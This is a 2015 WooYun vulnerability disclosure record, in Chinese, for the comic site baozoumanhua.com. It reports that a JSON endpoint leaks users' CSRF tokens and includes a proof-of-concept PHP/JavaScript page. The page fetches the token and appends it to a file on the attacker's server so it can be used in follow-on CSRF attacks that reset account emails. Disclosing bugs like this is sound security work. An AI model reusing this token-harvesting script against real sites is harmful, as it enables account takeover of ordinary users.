{"id": 38764, "wybug_id": "wooyun-2015-095501", "wybug_title": "暴走漫画设计缺陷可获取他人token导致可继续进行Csrf攻击(附poc)", "wybug_corp": "baozoumanhua.com", "wybug_author": "浅蓝", "wybug_date": "2015-02-04 17:13", "wybug_open_date": "2015-02-09 17:14", "wybug_type": "网络敏感信息泄漏", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 我是暴走漫画的菊花守护者 详细说明：  http://baozoumanhua.com/current_user.jsonhttp://baozou.com/current_user.json\n\n打开后会显示一些用户的信息，其中有\ncsrf_token:\"+ZEJOyFjEVBwx*****Hn5LyDUVqRjLqW/dF+o=\n只要获取到别人的token 就可以继续进行csrf攻击本码盲渣渣 拼凑了一个可以实现该功能的code\nx.php\n\n<script type=\"text/javascript\">//用于创建XMLHttpRequest对象function createXmlHttp() {//根据window.XMLHttpRequest对象是否存在使用不同的创建方式if (window.XMLHttpRequest) {xmlHttp = new XMLHttpRequest(); //FireFox、Opera等浏览器支持的创建方式} else {xmlHttp = new ActiveXObject(\"Microsoft.XMLHTTP\");//IE浏览器支持的创建方式}}//直接通过XMLHttpRequest对象获取远程网页源代码//function getSource() {createXmlHttp(); //创建XMLHttpRequest对象xmlHttp.onreadystatechange = writeSource; //设置回调函数xmlHttp.open(\"GET\", \"http://baozou.com/current_user.json\", true);xmlHttp.send(null);}//将远程网页源代码写入页面文字区域function writeSource() {if (xmlHttp.readyState == 4) {document.getElementById(\"source\").value = xmlHttp.responseText;}}</script><form method=\"POST\"><textarea name=\"c\" rows=\"10\" cols=\"80\" id=\"source\"></textarea><P><input type=\"button\" onclick=\"getSource()\" value=\"SB\"><P><input type=\"submit\" name=\"submit\" value=\"先点SB再点我\"><form><?phpif($_POST['submit']){$filename = 'file.htm';$c=$_POST['c'];$word = \"data:$c <BR>\";echo $c;$fh = fopen($filename, \"a\");fwrite($fh, $word);fclose($fh);}?>\n先用js获取到http://baozou.com/current_user.json 的源代码按钮SB被点击后将源码写入到textarea标签的值点击按钮2 会将textarea的值写到file.htm\n\n接下来我们就可以根据我之前提交的两个漏洞继续进行csrf攻击 WooYun: 暴漫主站存储xss坐等王尼玛中枪+刷金币等CSRF  WooYun: 暴走漫画#Csrf防御不当可利用此漏洞修改他人绑定邮箱从而重置密码   漏洞证明：  如上   修复方案：  =。= 别把token放到这   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-02-09 17:14 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}